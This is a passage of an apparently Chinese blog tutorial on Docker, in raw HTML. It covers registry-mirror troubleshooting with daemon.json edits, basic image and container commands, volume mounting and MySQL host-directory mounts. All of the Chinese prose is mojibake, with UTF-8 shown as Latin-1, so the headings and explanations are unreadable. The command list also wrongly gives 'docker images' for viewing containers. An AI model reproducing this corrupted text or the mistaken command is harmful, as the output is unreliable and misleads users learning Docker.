src="/2024/12/12/xu-ni-hua-ji-zhu/docker-ru-men-dao-jin-jie/%E6%88%AA%E5%B1%8F2024-12-12%2017.51.05.png" style="zoom:50%;"><h2 id="3-2-é•œåƒåŠ é€Ÿé—®é¢˜è§£å†³"><a href="#3-2-é•œåƒåŠ é€Ÿé—®é¢˜è§£å†³" class="headerlink" title="3.2 é•œåƒåŠ é€Ÿé—®é¢˜è§£å†³"></a>3.2 é•œåƒåŠ é€Ÿé—®é¢˜è§£å†³</h2><blockquote><p>é—®é¢˜è§£å†³ï¼š</p><p><img src="/2024/12/12/xu-ni-hua-ji-zhu/docker-ru-men-dao-jin-jie/%E6%88%AA%E5%B1%8F2024-12-12%2017.53.02.png" alt="æˆªå±2024-12-12 17.53.02"></p><p>ç½‘ä¸Šæœ‰å¾ˆå¤šåŸå› è§£é‡Šï¼Œä¸€æ˜¯è¯´å› ä¸ºæ²¡æœ‰é…ç½®é•œåƒåŠ é€Ÿï¼Œå¯æ˜¯åˆšåœ¨å‰é¢é…ç½®è¿‡ï¼Œå¹¶ä¸”ä¹Ÿé‡å¯äº†dockerã€‚</p><p>å°è¯•æ›´æ¢ä¸ºå¦‚ä¸‹çš„åœ°å€ï¼š</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token string">"registry-mirrors"</span>:<span class="token punctuation">[</span><span class="token string">"https://docker.mirrors.ustc.edu.cn"</span><span class="token punctuation">]</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>è¿˜æ˜¯ä¸è¡Œã€‚</p><p>ç»§ç»­é¼“æ£è¿™ä¸ªdaemon.json</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token punctuation">{</span> <span class="token string">"registry-mirrors"</span> <span class="token builtin class-name">:</span> <span class="token punctuation">[</span>   <span class="token string">"https://mirror.ccs.tencentyun.com"</span>,   <span class="token string">"http://registry.docker-cn.com"</span>,   <span class="token string">"http://docker.mirrors.ustc.edu.cn"</span>,   <span class="token string">"http://hub-mirror.c.163.com"</span> <span class="token punctuation">]</span>, <span class="token string">"insecure-registries"</span> <span class="token builtin class-name">:</span> <span class="token punctuation">[</span>   <span class="token string">"registry.docker-cn.com"</span>,   <span class="token string">"docker.mirrors.ustc.edu.cn"</span> <span class="token punctuation">]</span>, <span class="token string">"debug"</span> <span class="token builtin class-name">:</span> true, <span class="token string">"experimental"</span> <span class="token builtin class-name">:</span> <span class="token boolean">true</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token punctuation">{</span><span class="token string">"registry-mirrors"</span><span class="token builtin class-name">:</span> <span class="token punctuation">[</span><span class="token string">"https://docker.mirrors.ustc.edu.cn/"</span>,<span class="token string">"https://hub-mirror.c.163.com"</span>,<span class="token string">"https://registry.docker-cn.com"</span><span class="token punctuation">]</span>,<span class="token string">"insecure-registries"</span><span class="token builtin class-name">:</span> <span class="token punctuation">[</span><span class="token string">"10.0.0.12:5000"</span><span class="token punctuation">]</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>è¿˜æ˜¯ä¸è¡Œã€‚</p><img src="/2024/12/12/xu-ni-hua-ji-zhu/docker-ru-men-dao-jin-jie/%E6%88%AA%E5%B1%8F2024-12-12%2018.02.59.png" style="zoom:50%;"><p>å‘ç°æ˜¯åŸŸåè§£æçš„é—®é¢˜ï¼Œç„¶åå°è¯•è¿½åŠ ç½‘å¡é…ç½®ï¼š</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">vim</span> /etc/sysconfig/network-scripts/ifcfg-ens33<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><img src="/2024/12/12/xu-ni-hua-ji-zhu/docker-ru-men-dao-jin-jie/%E6%88%AA%E5%B1%8F2024-12-12%2018.05.00.png" style="zoom:40%;"><img src="/2024/12/12/xu-ni-hua-ji-zhu/docker-ru-men-dao-jin-jie/%E6%88%AA%E5%B1%8F2024-12-12%2018.09.10.png" style="zoom:50%;"><p>è¿˜æ˜¯æ— æ³•pingé€šã€‚</p><img src="/2024/12/12/xu-ni-hua-ji-zhu/docker-ru-men-dao-jin-jie/%E6%88%AA%E5%B1%8F2024-12-12%2018.06.14.png" alt="æˆªå±2024-12-12 18.06.14" style="zoom:50%;"><ul><li>ä½¿ç”¨digè·å–ip</li></ul><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">yum <span class="token function">install</span> bind-utils<span class="token function">dig</span> @114.114.114.114 registry-1.docker.io<span class="token function">dig</span> @8.8.8.8 registry-1.docker.io<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><img src="/2024/12/12/xu-ni-hua-ji-zhu/docker-ru-men-dao-jin-jie/%E6%88%AA%E5%B1%8F2024-12-12%2018.14.08.png" alt="æˆªå±2024-12-12 18.14.08"></p><p>digåˆ°çš„ip208.43.170.231â€¦pingä¸é€šã€‚</p><p>docker infoæŸ¥çœ‹ä¿¡æ¯ï¼Œé•œåƒä»“åº“å·²ç»é…ç½®æˆåŠŸï¼Œç½‘é¡µè®¿é—®ä¸€ä¸‹å„ä¸ªåœ°å€ï¼Œå‘ç°éƒ½è®¿é—®ä¸äº†ã€‚</p><p>æœ€ç»ˆé€šè¿‡ä¸æ–­å°è¯•å’ŒæŸ¥æ‰¾èµ„æ–™æ‰¾åˆ°ä¸€ç§å¯è¡Œçš„æ–¹æ³•ï¼Œç›´æ¥åœ¨é•œåƒåå‰é¢åŠ å¯ç”¨çš„ä»“åº“åœ°å€ï¼ˆè¿™ä¸ªéœ€è¦ä¸æ–­æœé›†æ›´æ–°ï¼Œæ—¶ä¸æ—¶å°±æœ‰å¯èƒ½è¢«å¢™ï¼‰ã€‚</p><p>æœ€ç»ˆè§£å†³ï¼š</p><p>1ï¼‰æ”¶é›†ä»“åº“åœ°å€ï¼Œhttpè®¿é—®æµ‹è¯•è¿é€šæ€§å¹¶é…ç½®ã€‚</p><img src="/2024/12/12/xu-ni-hua-ji-zhu/docker-ru-men-dao-jin-jie/%E6%88%AA%E5%B1%8F2024-12-13%2009.14.38.png" style="zoom:50%;"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">https://docker.1panel.dev/<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">tee</span> /etc/docker/daemon.json <span class="token operator">&lt;&lt;</span><span class="token string">EOF{    "registry-mirrors": ["https://docker.1panel.dev"]}EOF</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">systemctl daemon-reloadsystemctl restart <span class="token function">docker</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>2ï¼‰æ‹‰å–é•œåƒçš„æ—¶å€™æ·»åŠ è·¯å¾„</p><p>æŒ‰ç…§ä¸Šé¢çš„è¿‡ç¨‹æ“ä½œä¹‹åï¼Œè¿˜æ˜¯ä¼šæŠ¥é”™ã€‚</p><p><img src="/2024/12/12/xu-ni-hua-ji-zhu/docker-ru-men-dao-jin-jie/%E6%88%AA%E5%B1%8F2024-12-13%2009.15.17.png" alt="æˆªå±2024-12-13 09.15.17"></p><p>è¿™æ—¶å€™æ·»åŠ è·¯å¾„è¿›è¡Œå°è¯•ã€‚</p><img src="/2024/12/12/xu-ni-hua-ji-zhu/docker-ru-men-dao-jin-jie/%E6%88%AA%E5%B1%8F2024-12-13%2009.17.23.png" alt="æˆªå±2024-12-13 09.17.23" style="zoom:50%;"><img src="/2024/12/12/xu-ni-hua-ji-zhu/docker-ru-men-dao-jin-jie/%E6%88%AA%E5%B1%8F2024-12-13%2009.18.00.png" alt="æˆªå±2024-12-13 09.18.00" style="zoom:50%;"><p>è¯´æ˜è¿˜æ˜¯æŒ‚æ‰äº†ã€‚é‚£ä¹ˆå°±éœ€è¦ç»§ç»­æ‰¾æ–°çš„èƒ½ç”¨çš„é•œåƒä»“åº“ã€‚</p><p><a href="https://www.cnblogs.com/Nine4Cool/p/18499621">https://www.cnblogs.com/Nine4Cool/p/18499621</a></p><p><a href="https://blog.csdn.net/llc580231/article/details/139979603">https://blog.csdn.net/llc580231/article/details/139979603</a></p><p>æœ€åä¸‹é¢ä¸€äº›å¯ç”¨çš„é•œåƒä»“åº“åœ°å€ï¼š</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">https://docker.m.daocloud.iohttps://docker.zhai.cm<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><img src="/2024/12/12/xu-ni-hua-ji-zhu/docker-ru-men-dao-jin-jie/%E6%88%AA%E5%B1%8F2024-12-13%2009.46.59.png" alt="æˆªå±2024-12-13 09.46.59" style="zoom:50%;"><p>æ³¨æ„ï¼šå•æ¬¡æŒ‡å®šä»æŸä¸ªä»“åº“æ‹‰å–é•œåƒï¼ŒæŒ‡å®š<code>åŸŸå/library/mysql</code>ã€‚</p><p><img src="/2024/12/12/xu-ni-hua-ji-zhu/docker-ru-men-dao-jin-jie/%E6%88%AA%E5%B1%8F2024-12-13%2009.42.02.png" alt="æˆªå±2024-12-13 09.42.02"></p><p><img src="/2024/12/12/xu-ni-hua-ji-zhu/docker-ru-men-dao-jin-jie/%E6%88%AA%E5%B1%8F2024-12-13%2009.44.59.png" alt="æˆªå±2024-12-13 09.44.59"></p><p>ä»ç„¶ä¼šæ‹‰å–å¤±è´¥ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚</p><p>ç”¨<a href="https://docker.zhai.cm/">https://docker.zhai.cm</a> æ‹‰å–æˆåŠŸã€‚</p><p><img src="/2024/12/12/xu-ni-hua-ji-zhu/docker-ru-men-dao-jin-jie/%E6%88%AA%E5%B1%8F2024-12-13%2009.49.46.png" alt="æˆªå±2024-12-13 09.49.46"></p><p>æ‰€ä»¥è¿›è¡Œé…ç½®ï¼š</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">tee</span> /etc/docker/daemon.json <span class="token operator">&lt;&lt;</span><span class="token string">EOF{    "registry-mirrors": ["https://docker.zhai.cm"]}EOF</span>systemctl daemon-reloadsystemctl restart <span class="token function">docker</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>å†å°è¯•æ‹‰å–ä¸€ä¸‹nginxé•œåƒã€‚</p><img src="/2024/12/12/xu-ni-hua-ji-zhu/docker-ru-men-dao-jin-jie/%E6%88%AA%E5%B1%8F2024-12-13%2009.55.08.png" alt="æˆªå±2024-12-13 09.55.08" style="zoom:50%;"><p>æˆåŠŸæ‹‰å–å¾—ã€‚</p><p>æ‰€ä»¥æ ¸å¿ƒä¸­çš„æ ¸å¿ƒå°±æ˜¯æ‹¿åˆ°æµç•…å¯ç”¨çš„é•œåƒä»“åº“åœ°å€ã€‚</p></blockquote><h2 id="3-3-è®¿é—®æµ‹è¯•"><a href="#3-3-è®¿é—®æµ‹è¯•" class="headerlink" title="3.3 è®¿é—®æµ‹è¯•"></a>3.3 è®¿é—®æµ‹è¯•</h2><img src="/2024/12/12/xu-ni-hua-ji-zhu/docker-ru-men-dao-jin-jie/%E6%88%AA%E5%B1%8F2024-12-13%2011.24.57.png" style="zoom:50%;"><img src="/2024/12/12/xu-ni-hua-ji-zhu/docker-ru-men-dao-jin-jie/%E6%88%AA%E5%B1%8F2024-12-13%2011.23.39.png" style="zoom:40%;"><h1 id="å››ã€Dockerå‘½ä»¤åŸºç¡€"><a href="#å››ã€Dockerå‘½ä»¤åŸºç¡€" class="headerlink" title="å››ã€Dockerå‘½ä»¤åŸºç¡€"></a>å››ã€Dockerå‘½ä»¤åŸºç¡€</h1><h2 id="4-1-é•œåƒå‘½åè§„èŒƒ"><a href="#4-1-é•œåƒå‘½åè§„èŒƒ" class="headerlink" title="4.1 é•œåƒå‘½åè§„èŒƒ"></a>4.1 é•œåƒå‘½åè§„èŒƒ</h2><p>é•œåƒåç§°ä¸€èˆ¬åˆ†ä¸¤éƒ¨åˆ†ç»„æˆï¼š[repository]:[tag]ã€‚</p><ul><li><p>å…¶ä¸­repositoryå°±æ˜¯é•œåƒå</p></li><li><p>tagæ˜¯é•œåƒçš„ç‰ˆæœ¬</p></li></ul><p>åœ¨æ²¡æœ‰æŒ‡å®štagæ—¶ï¼Œé»˜è®¤æ˜¯latestï¼Œä»£è¡¨æœ€æ–°ç‰ˆæœ¬çš„é•œåƒã€‚</p><img src="/2024/12/12/xu-ni-hua-ji-zhu/docker-ru-men-dao-jin-jie/%E6%88%AA%E5%B1%8F2024-12-13%2011.28.36.png" style="zoom:40%;"><h2 id="4-2-å‘½ä»¤æ¦‚è¿°"><a href="#4-2-å‘½ä»¤æ¦‚è¿°" class="headerlink" title="4.2 å‘½ä»¤æ¦‚è¿°"></a>4.2 å‘½ä»¤æ¦‚è¿°</h2><p>Dockeræœ€å¸¸è§çš„å‘½ä»¤å°±æ˜¯æ“ä½œé•œåƒã€å®¹å™¨çš„å‘½ä»¤ï¼Œè¯¦è§å®˜æ–¹æ–‡æ¡£ï¼š<a href="https://docs.docker.com/"> https://docs.docker.com/</a></p><img src="/2024/12/12/xu-ni-hua-ji-zhu/docker-ru-men-dao-jin-jie/%E6%88%AA%E5%B1%8F2024-12-13%2011.30.50.png" alt="dockerå‘½ä»¤æ¦‚è§ˆ" style="zoom:50%;"><h2 id="4-3-æ¡ˆä¾‹ç»ƒä¹ "><a href="#4-3-æ¡ˆä¾‹ç»ƒä¹ " class="headerlink" title="4.3 æ¡ˆä¾‹ç»ƒä¹ "></a>4.3 æ¡ˆä¾‹ç»ƒä¹ </h2><p>åœ¨DockerHubä¸­æœç´¢Nginxé•œåƒï¼ŒæŸ¥çœ‹é•œåƒçš„åç§°</p><ul><li><p>æ‹‰å–Nginxé•œåƒï¼šdocker pull é•œåƒå</p></li><li><p>æŸ¥çœ‹æœ¬åœ°é•œåƒåˆ—è¡¨ï¼šdocker images</p></li><li><p>åˆ›å»ºå¹¶è¿è¡ŒNginxå®¹å™¨ï¼šdocker run -d </p></li><li><p>æŸ¥çœ‹å®¹å™¨ï¼š docker images</p></li><li><p>åœæ­¢å®¹å™¨ï¼šdocker stop</p></li><li><p>å†æ¬¡å¯åŠ¨å®¹å™¨ï¼šdocker start</p></li><li><p>è¿›å…¥Nginxå®¹å™¨ï¼šdocker exec -it</p></li><li><p>åˆ é™¤å®¹å™¨ï¼šdocker rm</p></li></ul><h2 id="4-4-å‘½ä»¤åˆ«å"><a href="#4-4-å‘½ä»¤åˆ«å" class="headerlink" title="4.4 å‘½ä»¤åˆ«å"></a>4.4 å‘½ä»¤åˆ«å</h2><p>docker psçš„è¾“å‡ºå¯è¯»æ€§è¾ƒå·®ï¼Œå¦‚ä¸‹å›¾æ‰€ç¤ºï¼š</p><p><img src="/2024/12/12/xu-ni-hua-ji-zhu/docker-ru-men-dao-jin-jie/%E6%88%AA%E5%B1%8F2024-12-13%2013.20.30.png" alt="æˆªå±2024-12-13 13.20.30"></p><p>ä¸ºäº†ç®€åŒ–docker pså‘½ä»¤çš„è¾“å‡ºï¼Œé€šå¸¸ä¼šç”¨å¦‚ä¸‹çš„å‘½ä»¤æ¥æŸ¥çœ‹å®¹å™¨ä¿¡æ¯ï¼š</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">docker</span> <span class="token function">ps</span> <span class="token parameter variable">--format</span> <span class="token string">"table {{.ID}}<span class="token entity" title="\t">\t</span> {{.Image}}<span class="token entity" title="\t">\t</span>{{.Ports}}<span class="token entity" title="\t">\t</span>{{.Status}}<span class="token entity" title="\t">\t</span>{{.Names}}"</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>å‘½ä»¤å†—é•¿ä¸ä¾¿äºè®°å¿†ï¼Œå¯ä»¥åœ¨ï½/.bashrcä¸­å‘½åä¸€ä¸ªåˆ«åã€‚ç¼–è¾‘ï½/.bashrcï¼Œæ·»åŠ å¦‚ä¸‹å†…å®¹ï¼ˆé¡ºä¾¿æŠŠdocker imagesä¹Ÿç®€åŒ–äº†ï¼‰ï¼š</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">vim</span> ï½/.bashrc<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2024/12/12/xu-ni-hua-ji-zhu/docker-ru-men-dao-jin-jie/%E6%88%AA%E5%B1%8F2024-12-13%2013.22.01.png" alt="æˆªå±2024-12-13 13.22.01"></p><p>-a å‚æ•°æ˜¯ä¸ºäº†æ˜¾ç¤ºé‚£äº›åœæ­¢è¿è¡Œä½†æ²¡æœ‰è¢«åˆ é™¤çš„å®¹å™¨ã€‚</p><p>ä¿å­˜é€€å‡ºä¹‹åï¼Œæ‰§è¡Œ</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">source</span> ï½/.bashrc<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>æµ‹è¯•ï¼š</p><p><img src="/2024/12/12/xu-ni-hua-ji-zhu/docker-ru-men-dao-jin-jie/%E6%88%AA%E5%B1%8F2024-12-13%2013.19.39.png" alt="æˆªå±2024-12-13 13.19.39"></p><h1 id="äº”ã€æ•°æ®å·"><a href="#äº”ã€æ•°æ®å·" class="headerlink" title="äº”ã€æ•°æ®å·"></a>äº”ã€æ•°æ®å·</h1><h2 id="5-1-æ•°æ®å·"><a href="#5-1-æ•°æ®å·" class="headerlink" title="5.1 æ•°æ®å·"></a>5.1 æ•°æ®å·</h2><p>æ•°æ®å·ï¼ˆvolumeï¼‰æ˜¯ä¸€ä¸ªè™šæ‹Ÿç›®å½•ï¼Œæ˜¯å®¹å™¨å†…ç›®å½•ä¸å®¿ä¸»æœºç›®å½•ä¹‹é—´æ˜ å°„çš„æ¡¥æ¢ã€‚</p><img src="/2024/12/12/xu-ni-hua-ji-zhu/docker-ru-men-dao-jin-jie/%E6%88%AA%E5%B1%8F2024-12-13%2013.28.19.png" style="zoom:50%;"><p>å¦‚å›¾æ‰€ç¤ºï¼Œé€šè¿‡åˆ›å»ºæ•°æ®å·å¯ä»¥å®ç°å®¿ä¸»æœºç›®å½•å’Œå®¹å™¨ç›®å½•çš„åŒæ­¥è¯»å†™æ“ä½œã€‚</p><h2 id="5-2-æ•°æ®å·ç›¸å…³çš„å‘½ä»¤"><a href="#5-2-æ•°æ®å·ç›¸å…³çš„å‘½ä»¤" class="headerlink" title="5.2 æ•°æ®å·ç›¸å…³çš„å‘½ä»¤"></a>5.2 æ•°æ®å·ç›¸å…³çš„å‘½ä»¤</h2><table><thead><tr><th>å‘½ä»¤</th><th>è¯´æ˜</th><th>æ–‡æ¡£åœ°å€</th></tr></thead><tbody><tr><td>docker volume create</td><td>åˆ›å»ºæ•°æ®å·</td><td><a href="https://docs.docker.com/engine/reference/commandline/volume_create/">docker   volume create</a></td></tr><tr><td>docker volume ls</td><td>æŸ¥çœ‹æ‰€æœ‰æ•°æ®å·</td><td><a href="https://docs.docker.com/engine/reference/commandline/volume_ls/">docker   volume ls</a></td></tr><tr><td>docker volume rm</td><td>åˆ é™¤æŒ‡å®šæ•°æ®å·</td><td><a href="https://docs.docker.com/engine/reference/commandline/volume_prune/">docker   volume rm</a></td></tr><tr><td>docker volume inspect</td><td>æŸ¥çœ‹æŸä¸ªæ•°æ®å·çš„è¯¦æƒ…</td><td><a href="https://docs.docker.com/engine/reference/commandline/volume_inspect/">docker   volume inspect</a></td></tr><tr><td>docker volume prune</td><td>æ¸…é™¤æ•°æ®å·</td><td><a href="https://docs.docker.com/engine/reference/commandline/volume_prune/">docker   volume prune</a></td></tr></tbody></table><h2 id="5-3-æ¡ˆä¾‹ä¸€ï¼ˆå·åæŒ‚è½½ï¼‰"><a href="#5-3-æ¡ˆä¾‹ä¸€ï¼ˆå·åæŒ‚è½½ï¼‰" class="headerlink" title="5.3 æ¡ˆä¾‹ä¸€ï¼ˆå·åæŒ‚è½½ï¼‰"></a>5.3 æ¡ˆä¾‹ä¸€ï¼ˆå·åæŒ‚è½½ï¼‰</h2><h3 id="5-3-1-æ¡ˆä¾‹æè¿°"><a href="#5-3-1-æ¡ˆä¾‹æè¿°" class="headerlink" title="5.3.1 æ¡ˆä¾‹æè¿°"></a>5.3.1 æ¡ˆä¾‹æè¿°</h3><ul><li>åˆ›å»ºNginxå®¹å™¨ï¼Œä¿®æ”¹nginxå®¹å™¨å†…çš„htmlç›®å½•ä¸‹çš„index.htmlæ–‡ä»¶ï¼ŒæŸ¥çœ‹å˜åŒ–</li></ul><blockquote><p>å°è¯•è¿›å…¥å®¹å™¨è¿›è¡Œä¿®æ”¹ï¼Œå‘ç°viå‘½ä»¤ä¸å­˜åœ¨ã€‚è¿™æ˜¯å› ä¸ºé•œåƒä¸€èˆ¬éƒ½æ˜¯æœ€å°åŒ–å®‰è£…ï¼Œå¹¶æ²¡æœ‰æå‰é¢„ç½®å„ç§å·¥å…·ã€‚</p></blockquote><ul><li>å°†é™æ€èµ„æºéƒ¨ç½²åˆ°nginxçš„htmlç›®å½•</li></ul><blockquote><p>æƒ³ä»å®¿ä¸»æœºæ‹·è´èµ„æºåˆ°å®¹å™¨ä¸­è¯¥æ€ä¹ˆåŠï¼Ÿ</p></blockquote><h3 id="5-3-2-æ¡ˆä¾‹è§£å†³"><a href="#5-3-2-æ¡ˆä¾‹è§£å†³" class="headerlink" title="5.3.2 æ¡ˆä¾‹è§£å†³"></a>5.3.2 æ¡ˆä¾‹è§£å†³</h3><p>åœ¨æ‰§è¡Œdocker runå‘½ä»¤æ—¶ï¼Œä½¿ç”¨ <strong>-v</strong>  æ•°æ®å·:å®¹å™¨å†…ç›®å½•å¯ä»¥å®Œæˆæ•°æ®å·æŒ‚è½½</p><p>å½“åˆ›å»ºå®¹å™¨æ—¶ï¼Œå¦‚æœæŒ‚è½½äº†æ•°æ®å·ä¸”æ•°æ®å·ä¸å­˜åœ¨ï¼Œä¼šè‡ªåŠ¨åˆ›å»ºæ•°æ®å·</p><p>ä¸‹å›¾ä¸ºæ¡ˆä¾‹5.1çš„è§£å†³ï¼Œåœ¨docker run åˆ›å»ºå®¹å™¨çš„æ—¶å€™ï¼Œ-væŒ‡å®šæ•°æ®å·ã€‚</p><p><img src="/2024/12/12/xu-ni-hua-ji-zhu/docker-ru-men-dao-jin-jie/%E6%88%AA%E5%B1%8F2024-12-13%2013.49.08.png" alt="æˆªå±2024-12-13 13.49.08"></p><blockquote><p>å›é¡¾ï¼š</p><p>ä»€ä¹ˆæ˜¯æ•°æ®å·ï¼Ÿ</p><ul><li>æ•°æ®å·æ˜¯ä¸€ä¸ªè™šæ‹Ÿç›®å½•ï¼Œå®ƒå°†å®¿ä¸»æœºç›®å½•æ˜ å°„åˆ°å®¹å™¨å†…ç›®å½•ï¼Œæ–¹ä¾¿æˆ‘ä»¬æ“ä½œå®¹å™¨å†…æ–‡ä»¶ï¼Œæˆ–è€…æ–¹ä¾¿è¿ç§»å®¹å™¨äº§ç”Ÿçš„æ•°æ®ã€‚</li></ul><p>å¦‚ä½•æŒ‚è½½æ•°æ®å·ï¼Ÿ</p><ul><li>åœ¨åˆ›å»ºå®¹å™¨æ—¶ï¼Œåˆ©ç”¨ -v æ•°æ®å·åï¼šå®¹å™¨å†…ç›®å½•å®ŒæˆæŒ‚è½½</li><li>å®¹å™¨åˆ›å»ºæ—¶ï¼Œå¦‚æœå‘ç°æŒ‚è½½çš„æ•°æ®å·ä¸å­˜åœ¨æ—¶ï¼Œä¼šè‡ªåŠ¨åˆ›å»º</li></ul><p>æ•°æ®å·çš„å¸¸è§å‘½ä»¤æœ‰å“ªäº›ï¼Ÿ</p><ul><li>docker volume ls: æŸ¥çœ‹æ•°æ®å·</li><li>docker volume rm: åˆ é™¤æ•°æ®å·ã€‚</li><li>docker volume inspect: æŸ¥çœ‹æ•°æ®å·è¯¦æƒ…ã€‚</li><li>docker volume prune:  åˆ é™¤æœªä½¿ç”¨çš„æ•°æ®å·ã€‚</li></ul></blockquote><h2 id="5-4-æ¡ˆä¾‹äºŒï¼ˆå®¿ä¸»æœºç›®å½•æŒ‚è½½ï¼‰"><a href="#5-4-æ¡ˆä¾‹äºŒï¼ˆå®¿ä¸»æœºç›®å½•æŒ‚è½½ï¼‰" class="headerlink" title="5.4 æ¡ˆä¾‹äºŒï¼ˆå®¿ä¸»æœºç›®å½•æŒ‚è½½ï¼‰"></a>5.4 æ¡ˆä¾‹äºŒï¼ˆå®¿ä¸»æœºç›®å½•æŒ‚è½½ï¼‰</h2><h3 id="5-4-1-æ¡ˆä¾‹æè¿°"><a href="#5-4-1-æ¡ˆä¾‹æè¿°" class="headerlink" title="5.4.1 æ¡ˆä¾‹æè¿°"></a>5.4.1 æ¡ˆä¾‹æè¿°</h3><p>éœ€æ±‚ï¼š</p><ul><li><p>æŸ¥çœ‹mysqlå®¹å™¨ï¼Œåˆ¤æ–­æ˜¯å¦æœ‰æ•°æ®å·æŒ‚è½½</p></li><li><p>åŸºäºå®¿ä¸»æœºç›®å½•å®ç°MySQLæ•°æ®ç›®å½•ã€é…ç½®æ–‡ä»¶ã€åˆå§‹åŒ–è„šæœ¬çš„æŒ‚è½½ï¼ˆæŸ¥é˜…å®˜æ–¹é•œåƒæ–‡æ¡£ï¼‰</p></li></ul><p>â‘ æŒ‚è½½/root/mysql/dataåˆ°å®¹å™¨å†…çš„/var/lib/mysqlç›®å½•</p><p>â‘¡æŒ‚è½½/root/mysql/initåˆ°å®¹å™¨å†…çš„/docker-entrypoint-initdb.dç›®å½•ï¼Œæå‰å‡†å¤‡çš„SQLè„šæœ¬</p><p>â‘¢æŒ‚è½½/root/mysql/confåˆ°å®¹å™¨å†…çš„/etc/mysql/conf.dç›®å½•ï¼Œæå‰å‡†å¤‡çš„é…ç½®æ–‡ä»¶ã€‚</p><h3 id="5-4-2-æ¡ˆä¾‹è§£å†³"><a href="#5-4-2-æ¡ˆä¾‹è§£å†³" class="headerlink" title="5.4.2 æ¡ˆä¾‹è§£å†³"></a>5.4.2 æ¡ˆä¾‹è§£å†³</h3><p>åœ¨æ‰§è¡Œdocker runå‘½ä»¤æ—¶ï¼Œä½¿ç”¨ <strong>-v</strong> <strong>æœ¬åœ°ç›®å½•</strong> <strong>:</strong> <strong>å®¹å™¨å†…ç›®å½•</strong> å¯ä»¥å®Œæˆæœ¬åœ°ç›®å½•æŒ‚è½½</p><p>æœ¬åœ°ç›®å½•å¿…é¡»ä»¥â€œ**/<strong>â€æˆ– â€œ</strong>./**â€ å¼€å¤´ï¼Œå¦‚æœç›´æ¥ä»¥åç§°å¼€å¤´ï¼Œä¼šè¢«è¯†åˆ«ä¸ºæ•°æ®å·è€Œéæœ¬åœ°ç›®å½•</p><ul><li><p>-v mysql:/var/lib/mysql ä¼šè¢«è¯†åˆ«ä¸ºä¸€ä¸ªæ•°æ®å·å«mysql</p></li><li><p>-v ./mysql:/var/lib/mysql ä¼šè¢«è¯†åˆ«ä¸ºå½“å‰ç›®å½•ä¸‹çš„mysqlç›®å½•</p></li></ul><p><img src="/2024/12/12/xu-ni-hua-ji-zhu/docker-ru-men-dao-jin-jie/%E6%88%AA%E5%B1%8F2024-12-13%2016.34.22.png" alt="æˆªå±2024-12-13 16.34.22"></p><img src="/2024/12/12/xu-ni-hua-ji-zhu/docker-ru-men-dao-jin-jie/%E6%88%AA%E5%B1%8F2024-12-13%2016.36.13.png" style="zoom:50%;"><p>æµ‹è¯•æ•°æ®æˆåŠŸç”Ÿæˆï¼Œè¯´æ˜æˆ‘ä»¬æŒ‚è½½çš„æœ¬åœ°initç›®å½•ä¸­çš„sqlè„šæœ¬è¢«æˆåŠŸæ‰§è¡Œã€‚</p><h1 id="å…­ã€è‡ªå®šä¹‰é•œåƒ"><a href="#å…­ã€è‡ªå®šä¹‰é•œåƒ" class="headerlink" title="å…­ã€è‡ªå®šä¹‰é•œåƒ"></a>å…­ã€è‡ªå®šä¹‰é•œåƒ</h1><h2 id="6-1-é•œåƒç»“æ„"><a href="#6-1-é•œåƒç»“æ„" class="headerlink" title="6.1 é•œåƒç»“æ„"></a>6.1 é•œåƒç»“æ„</h2><p>é•œåƒå°±æ˜¯åŒ…å«äº†ç¨‹åºè¿è¡Œçš„ç³»ç»Ÿå‡½æ•°åº“ã€åº”ç”¨ç¨‹åºã€è¿è¡Œé…ç½®ç­‰æ–‡ä»¶çš„æ–‡ä»¶åŒ…ã€‚æ„å»ºé•œåƒçš„è¿‡ç¨‹å…¶å®å°±æ˜¯æŠŠä¸Šè¿°æ–‡ä»¶æ‰“åŒ…çš„è¿‡ç¨‹ã€‚</p><img src="/2024/12/12/xu-ni-hua-ji-zhu/docker-ru-men-dao-jin-jie/%E6%88%AA%E5%B1%8F2024-12-17%2010.24.35.png" style="zoom:40%;"><p>é•œåƒç»“æ„ï¼š</p><img src="/2024/12/12/xu-ni-hua-ji-zhu/docker-ru-men-dao-jin-jie/%E6%88%AA%E5%B1%8F2024-12-17%2010.26.13.png" style="zoom:35%;"><h2 id="6-2-Dockerfile"><a href="#6-2-Dockerfile" class="headerlink" title="6.2 Dockerfile"></a>6.2 